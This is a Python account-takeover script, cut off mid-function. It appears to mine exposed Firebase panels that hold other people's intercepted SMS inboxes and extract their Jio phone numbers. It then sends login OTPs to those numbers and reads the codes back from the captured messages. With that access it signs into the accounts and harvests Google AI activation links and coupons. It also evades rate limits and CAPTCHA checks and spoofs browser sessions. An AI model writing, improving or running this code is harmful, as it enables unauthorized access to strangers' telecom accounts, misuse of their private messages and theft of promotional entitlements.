"""
Jio Gemini Activation Scanner (plus build)
Flow: live panels -> online devices -> scored number candidates -> OTP -> link

Changes over upstream, in order of impact:

1. Panels never go stale. `panel_discovery.py` harvests panels from upstream
   lists, every fork and GitHub search, retries dead `*.firebaseio.com` names on
   regional `*.firebasedatabase.app` hosts, and probes each database before use.
   `--refresh` rebuilds; a 6h cache makes normal runs instant.
2. Three panel schema families instead of one. Upstream only understood
   `{id: {status: true, simInfo: {phoneNumber}}}`, which no surviving panel
   speaks any more. Devices are now classified by schema, online-ness falls back
   to inbox freshness, and message numbers are read from every key family
   (phone, mobile, msisdn, number, to, cleanNumber, address, simInfo.phoneNumber)
   with contextual scoring instead of a single hardcoded pattern.
3. OTP ordering is settled per device, not per panel: the device whose inbox
   produced the number is the one polled.
4. Jio rate limits are handled: paced sends, 429 -> backoff, `CAPTCHA_REQUIRED`
   reported as its own status instead of being mistaken for a non-Jio number.
5. Numbers are deduped across runs, and devices with cold inboxes are skipped.
6. Fixed: duplicate output-path constants, thread-shared sessions, O(n^2) link
   dedupe, inline `BaseException` swallowing, doc/code default drift.
"""
from __future__ import annotations

import argparse
import csv
import json
import html
import random
import re
import sys
import threading
import time
from collections import Counter
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime, timedelta, timezone
from pathlib import Path
from typing import Any
from urllib.parse import unquote

import requests

import panel_discovery as discovery

if sys.stdout.encoding and sys.stdout.encoding.lower() not in {"utf-8", "utf8"}:
    try:
        sys.stdout.reconfigure(encoding="utf-8")
    except Exception:
        pass

BASE_DIR = Path(__file__).resolve().parent
LINKS_FILE = BASE_DIR / "gemini_activation_links.txt"
RESULTS_FILE = BASE_DIR / "gemini_results.csv"
SEEN_FILE = BASE_DIR / "seen_numbers.txt"

MESSAGE_SCAN_LIMIT = 150
OTP_TIMEOUT = 90          # forwarders are slow: 90s default, not 15s
POLL_INTERVAL = 1.5
SEND_PACE = (4.0, 8.0)    # seconds between OTP sends, randomised
BACKOFF_429 = 45          # seconds to wait when Jio throttles us
CAPTCHA_WAIT = 240        # max seconds to wait out CAPTCHA_REQUIRED before skipping
LOCK_BLOCK = 30 * 60      # retry a LOCKED number after 30 min
MAX_INBOX_AGE_MIN = 180   # devices with colder inboxes are skipped
MAX_CANDIDATES = 3        # numbers tried per device before moving on
ADD_OWN_NUMBER = True     # fall back to the panel operator's SIM if nothing else
# A shared OTP box forwards for several numbers, so an inbox that answers is proof
# of SIM ownership: fire each candidate until one verifies, then claim.
FIREBASE_TIMEOUT = 20

JIO_BASE = "https://www.jio.com/api"
CHECK_NUMBER_URL = f"{JIO_BASE}/jio-recharge-service/recharge/mobility/number/{{mobile}}"
SEND_OTP_URL = f"{JIO_BASE}/jio-login-service/login/sendOtp"
VERIFY_OTP_URL = f"{JIO_BASE}/jio-login-service/login/validateOtp"
AUTH_URL = f"{JIO_BASE}/jio-authenticate-service/authenticate/authJsonData"
NAVIGATE_URL = f"{JIO_BASE}/jio-ott-service/ott/subscription/navigate/Z0241"
GOOGLE_URL = f"{JIO_BASE}/jio-ott-service/ott/subscription/google-ai"
ACTIVATE_URL = f"{JIO_BASE}/jio-ott-service/ott/subscription/activate/Z0241?source=JIO"

# Activation step. The offer's real link arrives from whichever of these answers
# with a redirect URL; the order is deliberate (current paths first, documented
# fallbacks last) because Jio reshuffles them between releases. The first entry is
# what the WAP offer page itself calls.
ACTIVATE_ATTEMPTS = (
    f"{JIO_BASE}/jio-ott-service/ott/subscription/google-lead",
    f"{JIO_BASE}/jio-ott-service/ott/subscription/activate/googleai",
    GOOGLE_URL,
    ACTIVATE_URL,
)
# One of these has to be hit for Jio to mark the offer consumed; the second is the
# path upstream used and is now 404, kept as a fallback.
SUBMIT_ATTEMPTS = (
    f"{JIO_BASE}/jio-ott-service/ott/subscription/submit?type=Z0241&source=JIO",
    f"{JIO_BASE}/jio-ott-service/ott/submission/submit",
)
GOOGLE_PAGE = "https://www.jio.com/selfcare/googleai/?header=no&type=Z0241&source=JIO"

BROWSER_UA = (
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/131.0 Safari/537.36"
)
MOBILE_UA = (
    "Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36"
)

# Context patterns, highest confidence first. Weights are deliberately larger than
# any freshness bonus: "your Jio number X" is real SIM evidence even when the
# message is hours old, while a bare 10-digit match is cheap coincidence.
CONTEXT_PATTERNS = (
    (re.compile(r"(?i)\bjio\s*(?:number|no[.]?|num)\s*[:=-]?\s*(?:[+]91)?\s*([6-9]\d{9})"), 60),
    (re.compile(r"(?i)\brecharge(?:\s+now)?\s+jio\s+no[.]?\s*[:=-]?\s*(?:[+]91)?\s*([6-9]\d{9})"), 60),
    (re.compile(r"(?i)(?:your|mobile|phone)\s*(?:number|no[.]?)\s*[:=-]?\s*([6-9]\d{9})"), 40),
    (re.compile(r"(?i)नंबर\s*[:=-]?\s*([6-9]\d{9})"), 60),
)
RAW_NUMBER_RE = re.compile(r"(?<!\d)([6-9]\d{9})(?!\d)")

# Eligibility hint from the panel's own SMS. A qualifying active recharge (₹349+) is
# one of the offer's conditions, and a plan that lapsed is not eligible.
PLAN_EXPIRED_RE = re.compile(
    r"(?i)(expired|has expired|is expired|expired on|recharge\s+immediately"
    r"|plan\s+expired)"
    r"|समाप्त"
)
PLAN_EXPIRING_RE = re.compile(
    r"(?i)(expiring|expires? (?:on|today|tomorrow)|समाप्त होने)")
PLAN_ACTIVE_RE = re.compile(
    r"(?i)(successfully recharged|recharge (?:of|successful)|plan activated|"
    r"valid till|data balance|complimentary .*active)"
    r"|रिचार्ज\s*(?:सफळ|सफल)"
    r"|રિચાર્જ\s*સફળ"
)
QUALIFYING_PLAN_RE = re.compile(r"(?:349|399|449|549|649|749|799|849|859|899|2999|3599)")

OTP_WORD_PATTERN = re.compile(r"(?i)\botp\b|one[ -]?time password|verification code")
OTP_PATTERN = re.compile(r"(?<!\d)(\d{6})(?!\d)")
SMS_SENDER_PATTERN = re.compile(r"www\.jio\.com|\bJio\b|\bJIO\b|JioMart|MyJio")

ACTIVATION_PATTERN = re.compile(
    r"https?://serviceactivation[.]google[.]com/subscription/new/"
    r"(?P<token>[A-Za-z0-9_-]{50,})(?P<padding>={0,2})",
    re.IGNORECASE,
)
# Secondary link family used WAP-side: a promo/plan token on one.google.com.
PROMO_PATTERN = re.compile(
    r"https?://one[.]google[.]com/(?:activate-plan|promo)\?[^\s\"'<>]+",
    re.IGNORECASE,
)
REDIRECT_KEYS = ("redirectionURL", "redirectUrl", "redirectionUrl", "url", "link")
COUPON_PATTERN = re.compile(
    r"(?:code|coupon|promo|voucher)\s*[:=-]?\s*\b([A-Z0-9]{4}-[A-Z0-9]{4,}(?:-[A-Z0-9]{4,})*)\b",
    re.IGNORECASE,
)

ALREADY_PHRASES = (
    "already active", "already activated", "already redeemed", "already claimed",
    "already availed", "already in use", "subscription already",
    "link has already been used", "already used",
)

MESSAGE_KEYS = ("message", "body", "messageText", "text", "msg", "title", "content")
NUMBER_KEYS = ("phoneNumber", "phone", "mobile", "msisdn", "number", "to", "target",
               "cleanNumber", "cleanPhone", "address")
TIME_KEYS = ("timestamp", "time", "created_at", "date", "ts", "sent_at")

# Freshness ranking: a number seen in the last few minutes outranks an old one
# that merely appeared in more messages (OTP inboxes are shared and reused).
FRESH_1H = 40
FRESH_3H = 20
FRESH_12H = 6
MIN_NUMBER_SCORE = 2

RESULT_FIELDS = (
    "serial_number", "panel_schema", "panel", "device_id", "mobile_number",
    "status", "plan_hint", "activation_url", "coupon_code", "nepal_date", "nepal_time",
)

_LOCK = threading.Lock()


# ============================== helpers ==================================== #
def nepal_now() -> tuple[str, str]:
    stamp = datetime.now(timezone.utc) + timedelta(hours=5, minutes=45)
    return stamp.strftime("%Y-%m-%d"), stamp.strftime("%I:%M:%S %p")


def normalize_mobile(value: Any) -> str | None:
    digits = re.sub(r"\D", "", str(value or ""))
    if len(digits) > 10 and digits.startswith("91"):
        digits = digits[-10:]
    elif len(digits) > 10:
        digits = digits[-10:]
    return digits if re.fullmatch(r"[6-9]\d{9}", digits) else None


def shallow_body(item: dict[str, Any]) -> str:
    """Message text only from this level's keys, no recursion (used to decide
    whether a node *is* a message or a container of messages)."""
    for key in MESSAGE_KEYS:
        value = item.get(key)
        if isinstance(value, str) and value:
            return value
    return ""


def message_body(item: dict[str, Any]) -> str:
    """Text of a message, digging through nested envelopes (`data`, `notification`)."""
    for key in MESSAGE_KEYS:
        value = item.get(key)
        if value:
            if isinstance(value, dict):
                nested = message_body(value)
                if nested:
                    return nested
            else:
                return str(value)
    for value in item.values():
        if isinstance(value, dict):
            nested = message_body(value)
            if nested:
                return nested
    return ""


def message_time(keypath: str, item: dict[str, Any]) -> float:
    for key in TIME_KEYS:
        try:
            return float(item[key])
        except (KeyError, TypeError, ValueError):
            continue
    for segment in reversed(keypath.split("/")):
        if segment.isdigit() and len(segment) >= 10:
            return float(segment)
    return 0.0


def flatten_messages(data: Any) -> list[tuple[str, dict[str, Any]]]:
    """Yield (keypath, item) for flat and per-device-nested message trees."""
    out: list[tuple[str, dict[str, Any]]] = []
    if not isinstance(data, dict):
        return out
    for key, value in data.items():
        if not isinstance(value, dict):
            continue
        if shallow_body(value):
            out.append((key, value))
            continue
        for sub_key, sub_value in value.items():
            if isinstance(sub_value, dict) and message_body(sub_value):
                out.append((f"{key}/{sub_key}", sub_value))
    return out


# ============================== sessions =================================== #
def firebase_session() -> requests.Session:
    session = requests.Session()
    session.headers.update({
        "Accept": "application/json",
        "Cache-Control": "no-cache",
        "User-Agent": BROWSER_UA,
    })
    return session


def jio_session() -> requests.Session:
    session = requests.Session()
    session.headers.update({
        "User-Agent": MOBILE_UA,
        "Accept": "application/json, text/plain, */*",
        "Accept-Language": "en-IN,en;q=0.9",
        "Origin": "https://www.jio.com",
        "Referer": "https://www.jio.com/selfcare/login/",
        "x-request-source": "wap",
    })
    return session


def response_json(response: requests.Response) -> dict[str, Any]:
    try:
        data = response.json()
    except ValueError:
        return {}
    return data if isinstance(data, dict) else {}


def api_message(data: dict[str, Any]) -> str:
    for key in ("errorMessage", "responseMessage", "responseMsg", "message"):
        if data.get(key):
            return str(data[key])
    return ""


def api_error(data: dict[str, Any]) -> str:
    """Error text only. Note that success bodies carry `responseMsg: OK`,
    which a naive api_message() check would misread as a failure."""
    for key in ("errorMessage", "error", "errorMsg"):
        if data.get(key):
            return str(data[key])
    code = str(data.get("responseCode", data.get("status", "")))
    if code and code not in ("200", "0"):
        return code
    return ""


# ============================== firebase =================================== #
def firebase_get(session: requests.Session, panel: dict[str, Any], path: str,
                 params: dict[str, Any] | None = None, retries: int = 3) -> Any:
    query = dict(params or {})
    key = panel.get("key") or ""
    if key and not key.startswith("http"):
        query["auth"] = key
    url = f"{panel['url']}/{path.strip('/')}.json"
    for attempt in range(retries):
        try:
            response = session.get(url, params=query, timeout=FIREBASE_TIMEOUT)
            response.raise_for_status()
            return response.json()
        except (requests.RequestException, ValueError) as exc:
            if attempt == retries - 1:
                raise exc
            time.sleep(1.5 * (attempt + 1))
    return None


def firebase_get_soft(session: requests.Session, panel: dict[str, Any], path: str,
                      params: dict[str, Any] | None = None) -> Any:
    try:
        return firebase_get(session, panel, path, params)
    except (requests.RequestException, ValueError):
        return {}


def device_messages(session: requests.Session, panel: dict[str, Any],
                    device_id: str, node: str, limit: int) -> dict[str, Any]:
    data = firebase_get_soft(session, panel, f"{node}/{device_id}",
                            {"orderBy": '"$key"', "limitToLast": max(1, limit)})
    return data if isinstance(data, dict) else {}


def otp_rank(*texts: str) -> int:
    """Higher is better. A number that is also in the body outranks a bare match."""
    blob = " ".join(t for t in texts if t)
    rank = 0
    if SMS_SENDER_PATTERN.search(blob):
        rank += 2
    if OTP_WORD_PATTERN.search(blob):
        rank += 1
    return rank


def number_scores(items: list[tuple[str, dict[str, Any]]]) -> list[tuple[str, int]]:
    """Rank candidate SIM numbers for a device.

    Order of evidence: the device's own SIM fields, then message context patterns,
    then bare 10-digit matches, plus a freshness and sender bonus so a number that
    just texted the device with a Jio OTP beats one that texted it hours ago.
    """
    scores: Counter[str] = Counter()
    now_ms = time.time() * 1000
    for keypath, item in items:
        body = message_body(item)
        sender = str(item.get("sender") or item.get("from") or "")
        rank = otp_rank(body, sender)
        direct = normalize_mobile(item.get("phoneNumber"))
        if direct:
            scores[direct] += 10
        sim = item.get("simInfo")
        if isinstance(sim, dict):
            value = normalize_mobile(sim.get("phoneNumber"))
            if value:
                scores[value] += 10
        seen_here: set[str] = set()
        for pattern, weight in CONTEXT_PATTERNS:
            for match in pattern.findall(body):
                value = normalize_mobile(match)
                if value:
                    scores[value] += weight + rank
                    seen_here.add(value)
        for match in RAW_NUMBER_RE.findall(body):
            value = normalize_mobile(match)
            if value:
                scores[value] += 1 + rank
                seen_here.add(value)
        stamp = message_time(keypath, item)
        if stamp and seen_here:
            age_h = (now_ms - stamp) / 3_600_000
            bonus = 0
            if age_h <= 1:
                bonus = FRESH_1H
            elif age_h <= 3:
                bonus = FRESH_3H
            elif age_h <= 12:
                bonus = FRESH_12H
            if bonus:
                for value in seen_here:
                    scores[value] += bonus
    return sorted(scores.items(), key=lambda pair: (-pair[1], pair[0]))


def plan_state(items: list[tuple[str, dict[str, Any]]], mobile: str,
               allow_unattributed: bool = False) -> str:
    """Eligibility hint from the newest plan-related SMS: active | expiring | expired | unknown.

    The newest message wins, because panels replay history: an "expiring tomorrow"
    notice followed by a "recharge successful" SMS means the plan is now good.

    Messages are attributed to `mobile`. On single-candidate panels the phone's own
    inbox is nearly always about one SIM, so `allow_unattributed` lets plan language
    count even when the SMS omits the number.
    """
    now = time.time() * 1000
    newest_stamp = 0.0
    verdict = "unknown"
    for keypath, item in items:
        body = message_body(item)
        if not body:
            continue
        stamp = message_time(keypath, item)
        if stamp < now - 30 * 86400_000:
            continue
        attributed = mobile in re.sub(r"\D", "", body)
        if not attributed and not allow_unattributed:
            continue
        if PLAN_EXPIRED_RE.search(body):
            candidate = "expired"
        elif PLAN_EXPIRING_RE.search(body):
            candidate = "expiring"
        elif PLAN_ACTIVE_RE.search(body):
            candidate = "active"
        else:
            continue
        if stamp >= newest_stamp:
            newest_stamp = stamp
            verdict = candidate
    return verdict


def panel_own_numbers(session: requests.Session, panel: dict[str, Any]) -> list[str]:
    """The panel operator's SIM from a device's `action.address` — last resort."""
    numbers: Counter[str] = Counter()
    clients = firebase_get_soft(session, panel, "clients")
    if isinstance(clients, dict):
        for record in clients.values():
            action = record.get("action") if isinstance(record, dict) else None
            if not isinstance(action, dict):
                continue
            value = normalize_mobile(action.get("address"))
            if value:
                numbers[value] += 1
    return [number for number, _ in numbers.most_common()]


def device_online(record: dict[str, Any], newest_ms: float) -> bool:
    status = record.get("status")
    if status is True or str(status).lower() == "true":
        return True
    if newest_ms <= 0:
        return False
    age_min = (time.time() * 1000 - newest_ms) / 60000
    return age_min <= MAX_INBOX_AGE_MIN


# ============================== jio api ==================================== #
_LAST_SEND = threading.Lock()
_send_clock = [0.0]


def pace_send() -> None:
    """Serialise OTP sends with a randomised gap so Jio does not throttle."""
    with _LAST_SEND:
        wait = _send_clock[0] - time.monotonic()
        if wait > 0:
            time.sleep(wait)
        _send_clock[0] = time.monotonic() + random.uniform(*SEND_PACE)


def check_number(session: requests.Session, mobile: str) -> str:
    """ok | not_jio | captcha | error

    www.jio.com intermittently stalls for a full timeout on a cold connection, so
    a second attempt is made before reporting a transport error.
    """
    for attempt in range(2):
        try:
            response = session.get(CHECK_NUMBER_URL.format(mobile=mobile), timeout=25)
            break
        except requests.RequestException:
            if attempt:
                return "error"
            time.sleep(2)
    data = response_json(response)
    message = api_message(data).upper()
    if "CAPTCHA" in message:
        return "captcha"
    if response.status_code == 429:
        return "captcha"
    if not response.ok or api_error(data):
        return "not_jio"
    return "ok" if data.get("primaryService") else "not_jio"


def wait_out_captcha(session: requests.Session, probe_mobile: str,
                     max_wait: int, step: int = 20) -> bool:
    """Jio's CAPTCHA_REQUIRED is a soft, time-decaying throttle: it lifts by
    itself after roughly 1-2 minutes. Poll the probe number until it clears.
    Returns True once the endpoint answers normally again."""
    if max_wait <= 0:
        return False
    print(f"  [429] waiting out CAPTCHA (<= {max_wait}s)...")
    deadline = time.monotonic() + max_wait
    while time.monotonic() < deadline:
        time.sleep(step)
        if check_number(session, probe_mobile) != "captcha":
            print("  [429] throttle lifted")
            return True
    print("  [429] still throttled")
    return False


def send_otp(session: requests.Session, mobile: str) -> str:
    """ok | locked | rate | invalid | error:<msg>"""
    for attempt in range(2):
        pace_send()
        try:
            response = session.post(
                SEND_OTP_URL,
                json={"mobileNumber": mobile, "loginFlowType": "MOBILE",
                      "alternateNumber": ""},
                timeout=20,
            )
        except requests.RequestException:
            if attempt == 0:
                time.sleep(3)
                continue
            return "error:network"
        if response.status_code == 429:
            if attempt == 0:
                time.sleep(BACKOFF_429)
                continue
            return "rate"
        data = response_json(response)
        message = api_message(data)
        if response.ok and str(data.get("responseCode", "200")) == "200":
            return "ok"
        upper = message.upper()
        if "LOCKED" in upper:
            return "locked"
        if "INVALID" in upper:
            return "invalid"
        if "CAPTCHA" in upper:
            return "rate"
        return f"error:{message[:40] or response.status_code}"
    return "rate"


def verify_otp(session: requests.Session, mobile: str, otp: str) -> bool:
    try:
        response = session.post(
            VERIFY_OTP_URL,
            json={"mobileNumber": mobile, "otp": otp},
            timeout=20,
        )
    except requests.RequestException:
        return False
    if not response.ok:
        return False
    return not api_error(response_json(response))


def wait_for_otp(session: requests.Session, panel: dict[str, Any], device_id: str,
                 node: str, known: set[str], newest_ms: float, mobile: str,
                 timeout: int, poll: float, seen_otps: set[str] | None = None) -> str:
    """Poll the device inbox for the OTP our send just delivered.

    Candidates are ranked by sender plausibility, then recency, so a forwarder run
    by a shop that also receives other OTPs does not hand us a MyJio-less code.
    `seen_otps` carries codes across calls, so one arriving during a previous
    candidate's window is still tried against the current number.
    """
    tried = seen_otps if seen_otps is not None else set()
    deadline = time.monotonic() + timeout
    while time.monotonic() < deadline:
        data = device_messages(session, panel, device_id, node, 20)
        found: list[tuple[int, float, str]] = []
        for keypath, item in flatten_messages(data):
            stamp = message_time(keypath, item)
            if keypath in known and stamp <= newest_ms:
                continue
            body = message_body(item)
            sender = str(item.get("sender") or item.get("from") or "")
            match = OTP_PATTERN.search(body)
            if not match or match.group(1) in tried:
                continue
            found.append((otp_rank(body, sender), stamp, match.group(1)))
        for _rank, _stamp, otp in sorted(found, reverse=True):
            tried.add(otp)
            if verify_otp(session, mobile, otp):
                return otp
        time.sleep(poll)
    return ""


def already_active(value: str) -> bool:
    normalized = " ".join((value or "").lower().replace("_", " ").split())
    return any(phrase in normalized for phrase in ALREADY_PHRASES)


def activation_url(value: str) -> str:
    text = html.unescape(value or "")
    for _ in range(5):
        decoded = unquote(text)
        if decoded == text:
            break
        text = decoded
    match = ACTIVATION_PATTERN.search(text)
    if not match:
        return ""
    return "https://serviceactivation.google.com/subscription/new/" + \
        match.group("token") + match.group("padding")


def coupon_code(value: str) -> str:
    match = COUPON_PATTERN.search(html.unescape(value or ""))
    return match.group(1).upper() if match else ""


def promo_url(value: str) -> str:
    match = PROMO_PATTERN.search(html.unescape(value or ""))
    return match.group(0) if match else ""


def harvest_link(data: dict[str, Any], raw: str) -> str:
    """Pull a redeemable Google URL out of any response shape Jio returns."""
    for key in REDIRECT_KEYS:
        value = data.get(key)
        if isinstance(value, str):
            url = activation_url(value) or promo_url(value)
            if url:
                return url
    for url in (activation_url(raw), promo_url(raw)):
        if url:
            return url
    return activation_url(json.dumps(data)) or promo_url(json.dumps(data))


def warm_pages(session: requests.Session) -> None:
    """Load the pages a browser would load, so their cookies are in the jar.

    The offer is normally reached from MyJio's web UI; those page hits set the
    Akamai/session cookies the OTT gateway looks at. Requests-only clients that
    skip straight to the API are the ones that get stuck on 401.
    """
    headers = {"Accept": "text/html,application/xhtml+xml", "User-Agent": BROWSER_UA,
               "Referer": "https://www.jio.com/selfcare/dashboard/"}
    for page in ("https://www.jio.com/selfcare/dashboard/", GOOGLE_PAGE,
                 GOOGLE_PAGE.replace("googleai", "google-ai")):
        try:
            session.get(page, headers=headers, timeout=20)
        except requests.RequestException:
            continue


def bind_session(session: requests.Session) -> bool:
    """Walk the offer handshake until the OTT endpoints stop answering 401.

    NAVIGATE_TO_LOGIN means the session is not bound to the offer yet; the
    handshake needs a couple of auth reads before `navigate` returns a URL.
    """
    dashboard = {"Accept": "application/json",
                 "Referer": "https://www.jio.com/selfcare/dashboard/"}
    warm_pages(session)
    for attempt in range(4):
        try:
            session.get(AUTH_URL, headers=dashboard, timeout=20)
            navigate = session.get(NAVIGATE_URL, headers=dashboard, timeout=20)
        except requests.RequestException:
            time.sleep(2)
            continue
        if navigate.status_code == 200:
            return True
        time.sleep(2 + attempt)
    return False


def claim_activation(session: requests.Session) -> tuple[str, str, str]:
    """Returns (status, redeem_url, coupon_code).

    Any 200 body carrying a Google redeem URL wins; `already active` markers stop
    early. Endpoints are tried in both GET and JSON-POST form because the offer
    side accepts POST on some of them.
    """
    dashboard = {"Accept": "application/json",
                 "Referer": "https://www.jio.com/selfcare/dashboard/"}
    offer = {"Accept": "application/json", "Referer": GOOGLE_PAGE,
             "x-request-source": "wap"}
    if not bind_session(session):
        return "api_session_invalid", "", ""

    last = "activation_api_failed"
    lead_ok = False
    unauthorized = False
    for url in ACTIVATE_ATTEMPTS:
        for method in (session.get, session.post):
            try:
                if method is session.post:
                    response = method(url, json={}, headers=offer, timeout=20)
                else:
                    response = method(url, headers=offer, timeout=20)
            except requests.RequestException:
                last = "activation_api_failed"
                continue
            data = response_json(response)
            raw = response.text
            if already_active(api_message(data) + raw):
                return "already_active", "", ""
            url_found = harvest_link(data, raw)
            if url_found:
                for submit in SUBMIT_ATTEMPTS:
                    try:
                        session.get(submit,
                                    headers={**offer, "Referer": GOOGLE_PAGE},
                                    timeout=20)
                        break
                    except requests.RequestException:
                        continue
                return "activation_url_found", url_found, coupon_code(raw)
            if "google-lead" in url and response.status_code == 200:
                lead_ok = True
            if response.status_code == 401:
                unauthorized = True
            last = ("activation_api_failed"
                    if response.status_code not in (200, 201) else "no_activation_url")
        time.sleep(0.5)

    # Lead generated and submission accepted, but the endpoint that hands over the
    # link refuses the session: that is Jio's entitlement gate, not our auth.
    if lead_ok and unauthorized:
        return "google_ai_unauthorized", "", ""
    return last, "", ""


# ============================== output ===================================== #
class Output:
    """Append-only writers; link dedupe is an in-memory set, not a re-read."""

    def __init__(self) -> None:
        self.lock = threading.Lock()
        self.links = self._read(LINKS_FILE)
        self.seen = self._read(SEEN_FILE)

    @staticmethod
    def _read(path: Path) -> set[str]:
        try:
            return {line.strip() for line in path.read_text(encoding="utf-8").splitlines()
                    if line.strip()}
        except OSError:
            return set()

    def seen_number(self, mobile: str) -> bool:
        with self.lock:
            return mobile in self.seen

    def add_number(self, mobile: str) -> None:
        with self.lock:
            if mobile in self.seen:
                return
            self.seen.add(mobile)
            with SEEN_FILE.open("a", encoding="utf-8") as handle:
                handle.write(mobile + "\n")

    def add_link(self, url: str) -> bool:
        if not url:
            return False
        with self.lock:
            if url in self.links:
                return False
            self.links.add(url)
            with LINKS_FILE.open("a", encoding="utf-8") as handle:
                handle.write(url + "\n")
            return True

    def result(self, serial: int, record: dict[str, Any], mobile: str,
               status: str, url: str, coupon: str = "", plan: str = "") -> None:
        date, clock = nepal_now()
        with self.lock:
            exists = RESULTS_FILE.exists() and RESULTS_FILE.stat().st_size > 0
            with RESULTS_FILE.open("a", newline="", encoding="utf-8") as handle:
                writer = csv.DictWriter(handle, fieldnames=RESULT_FIELDS)
                if not exists:
                    writer.writeheader()
                writer.writerow({
                    "serial_number": serial,
                    "panel_schema": record["panel"].get("schema", ""),
                    "panel": record["panel"]["url"],
                    "device_id": record["device_id"],
                    "mobile_number": mobile,
                    "status": status,
                    "plan_hint": plan,
                    "activation_url": url,
                    "coupon_code": coupon,
                    "nepal_date": date,
                    "nepal_time": clock,
                })


# ============================== discovery pass ============================= #
def scan_panel(session: requests.Session, panel: dict[str, Any],
               message_limit: int) -> list[dict[str, Any]]:
    """Return viable device records for one panel, with numbers pre-scored."""
    clients = firebase_get_soft(session, panel, "clients")
    devices: list[dict[str, Any]] = []
    if isinstance(clients, dict) and clients:
        for device_id, record in clients.items():
            if not isinstance(record, dict):
                continue
            node = "messages"
            if not isinstance(firebase_get_soft(session, panel, f"{node}/{device_id}"), dict):
                for alternative in ("user_sms", "sms"):
                    probe = firebase_get_soft(session, panel, f"{alternative}/{device_id}")
                    if isinstance(probe, dict) and probe:
                        node = alternative
                        break
            raw = device_messages(session, panel, device_id, node, message_limit)
            items = flatten_messages(raw)
            newest = max((message_time(k, v) for k, v in items), default=0.0)
            if not device_online(record, newest):
                continue
            candidates = [m for m, score in number_scores(items) if score >= MIN_NUMBER_SCORE]
            if not candidates and not ADD_OWN_NUMBER:
                continue
            devices.append({"panel": panel, "device_id": device_id, "node": node,
                            "newest": newest, "known": {k for k, _ in items},
                            "items": items,
                            "candidates": candidates[:MAX_CANDIDATES], "record": record})
        if devices and ADD_OWN_NUMBER:
            own = panel_own_numbers(session, panel)
            for device in devices:
                if not device["candidates"]:
                    device["candidates"] = own[:1]
        return devices

    # Panels without /clients (inbox-only family): index messages directly.
    for node in ("messages", "user_sms"):
        tree = firebase_get_soft(session, panel, node, {"shallow": "true"})
        if not isinstance(tree, dict) or not tree:
            continue
        for device_id in list(tree.keys())[:80]:
            raw = device_messages(session, panel, device_id, node, message_limit)
            items = flatten_messages(raw)
            newest = max((message_time(k, v) for k, v in items), default=0.0)
            if not device_online({}, newest):
                continue
            candidates = [m for m, score in number_scores(items) if score >= MIN_NUMBER_SCORE]
            if not candidates:
                continue
            devices.append({"panel": panel, "device_id": device_id, "node": node,
                            "newest": newest, "known": {k for k, _ in items},
                            "items": items,
                            "candidates": candidates[:MAX_CANDIDATES], "record": {}})
        if devices:
            break
    return devices


# ============================== main ======================================= #
def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(description="Jio Gemini Activation Scanner")
    parser.add_argument("--panels", type=str, default="",
                        help="panel file to use instead of discovery")
    parser.add_argument("--refresh", action="store_true",
                        help="re-harvest the panel list before running")
    parser.add_argument("--probe-clients", action="store_true",
                        help="count online devices during the probe (slower)")
    parser.add_argument("--write-panels", action="store_true",
                        help="write the discovered list to panels.txt then exit")
    parser.add_argument("--limit", type=int, default=0, help="max panels to scan")
    parser.add_argument("--skip", type=int, default=0, help="skip first N panels")
    parser.add_argument("--message-limit", type=int, default=MESSAGE_SCAN_LIMIT,
                        help="messages per device")
    parser.add_argument("--otp-timeout", type=int, default=OTP_TIMEOUT,
                        help="OTP wait timeout (seconds)")
    parser.add_argument("--poll-interval", type=float, default=POLL_INTERVAL,
                        help="Firebase poll interval (seconds)")
    parser.add_argument("--max-numbers", type=int, default=0,
                        help="stop after N numbers (0 = all)")
    parser.add_argument("--sweeps", type=int, default=1,
                        help="re-scan the panel list N times (fresh devices only)")
    parser.add_argument("--sweep-gap", type=int, default=60,
                        help="seconds between sweeps")
    parser.add_argument("--fresh-min", type=int, default=45,
                        help="in a re-sweep, only devices with inbox this fresh")
    parser.add_argument("--captcha-wait", type=int, default=CAPTCHA_WAIT,
                        help="seconds to wait out a Jio throttle before skipping")
    return parser.parse_args()


def load_panels_file(path: Path) -> list[tuple[str, str]]:
    return discovery.parse_panel_text(path.read_text(encoding="utf-8"))


def resolve_panels(args: argparse.Namespace) -> list[dict[str, Any]]:
    if args.panels:
        entries = [(url, key, discovery.SCHEMA_COMMAND)
                   for url, key in load_panels_file(Path(args.panels))]
    else:
        entries = discovery.get_panels(refresh=args.refresh,
                                       probe_clients=args.probe_clients)
    return [{"url": u, "key": k, "schema": s} for u, k, s in entries]


def process_device(device: dict[str, Any], state: dict[str, Any], args: argparse.Namespace,
                   output: "Output", statuses: Counter[str]) -> tuple[str, str, str]:
    """Fire OTP at each candidate until one verifies, then claim its link.

    Returns (status, url, coupon). `state` carries the shared per-number block
    list so a locked or already-redeemed number is not retried this session.
    """
    blocked: dict[str, float] = state["blocked"]
    jio = jio_session()
    pool: set[str] = set()          # OTP codes already tried for this device
    fired = False

    for mobile in device["candidates"]:
        if blocked.get(mobile, 0) > time.time():
            statuses["locked"] += 1
            continue
        if output.seen_number(mobile):
            statuses["already_seen"] += 1
            continue

        state["serial"] += 1
        print(f"\n[{state['serial']}] {mobile} ({mobile[-4:]})"
              f" <- {device['device_id'][:10]} [{device['panel']['schema']}]")

        plan = plan_state(device["items"], mobile,
                          allow_unattributed=len(device["candidates"]) == 1)
        if plan != "unknown":
            print(f"  plan hint: {plan}")

        state_ok = check_number(jio, mobile)
        if state_ok == "captcha" and wait_out_captcha(jio, mobile, args.captcha_wait):
            state_ok = check_number(jio, mobile)
        if state_ok == "captcha":
            statuses["captcha_required"] += 1
            output.result(state["serial"], device, mobile, "captcha_required", "", plan=plan)
            print("Status: captcha_required")
            return "captcha_required", "", ""
        if state_ok == "not_jio":
            statuses["not_jio_number"] += 1
            output.add_number(mobile)
            output.result(state["serial"], device, mobile, "not_jio_number", "", plan=plan)
            print("Status: not_jio_number")
            continue
        if state_ok == "error":
            statuses["check_failed"] += 1
            output.result(state["serial"], device, mobile, "check_failed", "", plan=plan)
            print("Status: check_failed")
            continue

        sent = send_otp(jio, mobile)
        if sent == "locked":
            blocked[mobile] = time.time() + LOCK_BLOCK
            statuses["otp_locked"] += 1
            output.add_number(mobile)
